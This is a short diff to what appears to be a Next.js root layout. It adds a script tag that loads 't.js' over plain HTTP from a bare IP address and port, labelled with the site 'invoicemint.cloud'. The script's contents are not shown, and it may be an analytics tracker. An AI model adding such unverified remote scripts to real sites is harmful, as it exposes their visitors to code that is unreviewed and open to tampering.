@@ -40,6 +40,11 @@ export default function RootLayout({
           crossOrigin="anonymous"
           strategy="lazyOnload"
         />
+        <Script
+          src="http://31.97.56.148:3098/t.js"
+          data-site="invoicemint.cloud"
+          strategy="lazyOnload"
+        />
       </body>
     </html>
   );
